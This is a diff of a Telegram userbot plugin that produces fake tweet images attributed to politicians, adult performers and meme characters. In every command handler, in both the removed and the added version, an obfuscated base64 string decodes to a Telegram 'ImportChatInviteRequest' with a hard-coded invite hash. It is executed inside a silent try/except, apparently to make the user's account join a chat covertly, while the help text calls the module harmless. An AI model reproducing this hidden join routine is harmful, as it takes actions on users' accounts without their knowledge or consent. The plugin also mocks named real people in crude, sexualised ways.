@@ -1,383 +1,305 @@
+import requests , re
+from PIL import Image
+from validators.url import url
 from . import *
 
-
-@Andencento.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
-async def nope(kraken):
-    user = kraken.pattern_match.group(1)
-    okvai = await eor(kraken, "Trying to tweet for you...")
-    if not user:
-        if kraken.is_reply:
-            (await kraken.get_reply_message()).message
+@bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
+async def nope(hemlo):
+    hell = hemlo.pattern_match.group(1)
+    if not hell:
+        if hemlo.is_reply:
+            what = (await hemlo.get_reply_message()).message
         else:
-            await eod(kraken, "I need some text to make a tweet🚶")
+            await hemlo.edit("I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(user))}")
-    await tweeter[0].click(
-        kraken.chat_id,
-        reply_to=kraken.reply_to_msg_id,
-        silent=True if kraken.is_reply else False,
-        hide_via=True,
-    )
-    await kraken.delete()
+    tweeter = await bot.inline_query(
+        "TwitterStatusBot", f"{(deEmojify(hell))}")
+    await tweeter[0].click(hemlo.chat_id,
+                            reply_to=hemlo.reply_to_msg_id,
+                            silent=True if hemlo.is_reply else False,
+                            hide_via=True)
+    await hemlo.delete()
 
 
-@Andencento.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+@bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Trump needs some text to tweet..")
+                await borg.edit("Send you text to trump so he can tweet.")
                 return
         else:
-            await eod(event, "Trump needs some text to tweet..")
+            await borg.edit("send you text to trump so he can tweet.")
             return
-    await eor(event, "Requesting trump to tweet...")
+    await borg.edit("Requesting trump to tweet...")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await trumptweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
-
-
-@Andencento.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+    borgfile = await trumptweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
+    
+@bot.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send your text to modi so he can tweet.")
+                await borg.edit("Send you text to modi so he can tweet.")
                 return
         else:
-            await eod(event, "send your text to modi so he can tweet.")
+            await borg.edit("send you text to modi so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting modi to tweet...")
+    await borg.edit("Requesting modi to tweet...")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await moditweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await moditweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
 
-
-@Andencento.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+    
+@bot.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="mia(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send your text to Mia so she can tweet.")
+                await borg.edit("Send you text to Mia so she can tweet.")
                 return
         else:
-            await eod(event, "Send your text to Mia so she can tweet.")
+            await borg.edit("Send you text to Mia so she can tweet.")
             return
-    await eor(event, "Requesting Mia to tweet...")
+    await borg.edit("Requesting Mia to tweet...")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await miatweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await miatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
 
-
-@Andencento.on(admin_cmd(pattern=r"dani(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+#@register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="pappu(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send your text to Dani so she can tweet.")
+                await borg.edit("Send a text to Pappu so he can tweet.")
                 return
         else:
-            await eod(event, "Send your text to Dani so she can tweet.")
+            await borg.edit("send your text to pappu so he can tweet.")
             return
-    await eor(event, "Requesting Dani to tweet...")
+    await borg.edit("Requesting pappu to tweet...")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await dani(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await papputweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
 
-
-# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
-@Andencento.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+#@register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="sunny(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send a text to Pappu so he can tweet.")
+                await borg.edit("Send a text to Sunny so she can tweet.")
                 return
         else:
-            await eod(event, "send your text to pappu so he can tweet.")
+            await borg.edit("send your text to sunny so she can tweet.")
             return
-    await edit_or_reply(event, "Requesting pappu to tweet...")
+    await borg.edit("Requesting sunny to tweet...🥰")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await papputweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await sunnytweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
 
-
-@Andencento.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+#@register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="johhny(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send a text to Sunny so she can tweet.")
+                await borg.edit("Send a text to Johhny so he can tweet.")
                 return
         else:
-            await eod(event, "send your text to sunny so she can tweet.")
+            await borg.edit("send your text to Johhny so he can tweet.")
             return
-    await eor(event, "Requesting sunny to tweet...🥰")
+    await borg.edit("Requesting johhny to tweet...😆")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await sunnytweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await sinstweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
 
-
-@Andencento.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+@bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send a text to Johhny so he can tweet.")
+                await borg.edit("Send you text to baapu so he can tweet.")
                 return
         else:
-            await eod(event, "send your text to Johhny so he can tweet.")
+            await borg.edit("send you text to baapu so he can tweet.")
             return
-    await edit_or_reply(event, "Requesting johhny to tweet...😆")
+    await borg.edit("Requesting baapu to tweet...")
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await sinstweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
+    borgfile = await taklatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() #bancho kitni baar bolu no offence
 
-
-@Andencento.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+#@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Send you text to baapu so he can tweet.")
+                await borg.edit("Give text for to write on banner, man")
                 return
         else:
-            await eod(event, "send you text to baapu so he can tweet.")
+            await borg.edit("Give text for to write on banner, man")
             return
-    await edit_or_reply(event, "Requesting baapu to tweet...")
+    await borg.edit("Your banner is under creation wait a sec...")    
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await taklatweet(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()  # bancho kitni baar bolu no offence
-
-
-@Andencento.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
+    borgfile = await changemymind(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
+    
+#@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
     if not text:
-        if event.is_reply:
+        if borg.is_reply:
             if not reply_to_id.media:
                 text = reply_to_id.message
             else:
-                await eod(event, "Give text for to write on banner, man")
+                await borg.edit("what should kanna write give text ")
                 return
         else:
-            await eod(event, "Give text for to write on banner, man")
+            await borg.edit("what should kanna write give text")
             return
-    await eor(event, "Your banner is under creation wait a sec...")
+    await borg.edit("Kanna is writing your text...")        
     try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
     except:
-        pass
+        pass   
     text = deEmojify(text)
-    eventfile = await changemymind(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
-
-
-
-@Andencento.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
-@Andencento.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
-async def nekobot(event):
-    text = event.pattern_match.group(1)
-    reply_to_id = event.message
-    if event.reply_to_msg_id:
-        reply_to_id = await event.get_reply_message()
-    if not text:
-        if event.is_reply:
-            if not reply_to_id.media:
-                text = reply_to_id.message
-            else:
-                await eod(event, "what should kanna write give text ")
-                return
-        else:
-            await eod(event, "what should kanna write give text")
-            return
-    await eor(event, "Kanna is writing your text...")
-    try:
-        user = str(
-            pybase64.b64decode(
-                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
-            )
-        )[2:49]
-        await event.client(user)
-    except:
-        pass
-    text = deEmojify(text)
-    eventfile = await kannagen(text)
-    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
-    await event.delete()
-
-
-CmdHelp("tweets").add_command(
-  "kanna", "<text>/<reply to text>", "Kanna writes for you"
-).add_command(
-  "cmm", "<text>/<reply>", "Get a banner of Change My Mind"
-).add_command(
-  "johhny", "<text>/<reply>", "Tweet with Johhny Sins"
-).add_command(
-  "sunny", "<text>/<reply>", "Tweet with Sunny Leone"
-).add_command(
-  "gandhi", "<text>/<reply>", "Tweet with Mahatma Gandhi"
-).add_command(
-  "pappu", "<text>/<reply>", "Tweet with pappu A.K.A Rahul Gandhi"
-).add_command(
-  "mia", "<text>/<reply>", "Tweet with Mia Khalifa 😍"
-).add_command(
-  "trump", "<text>/<reply>", "Tweet with Mr. DooLand Trump"
-).add_command(
-  "modi", "<text>/<reply>", "Tweet with Sir Narendra Modi"
-).add_command(
-  "tweet", "<text>/<reply>", "Tweets in your name"
-).add_command(
-  "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
-).add_info(
-  "Lets Tweet."
-).add_warning(
-  "✅ Harmless Module."
-).add()
+    borgfile = await kannagen(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete()
+    
+CMD_HELP.update({
+"tweet":
+"Tweet\
+\n\n`.tweet` (text)\
+     \nUsage : Tweet with modi\
+\n\n`.modi` (text)\
+     \nUsage : Tweet with modi\
+\n\n`.trump` (text)\
+     \nUsage : Tweet with trump\
+\n\n`.mia` (text)\
+     \nUsage : Tweet with mia\
+\n\n`.pappu` (text)\
+     \nUsage : Tweet with Rahul Gandhi\
+\n\n`.gandhi` (text)\
+     \nUsage : Tweet with Baapu🥺\n(No offence. Fun purpose only)\
+\n\n`.sunny` (text)\
+     \nUsage : Tweet with sunny leone\
+\n\n`.johhny` (text)\
+     \nUsage : Tweet with johhny sins\
+\n\n`.cmm` (text)\
+     \nUsage : Get a banner\
+\n\n`.kanna` (text)\
+     \nUsage : Kanna write for you"})
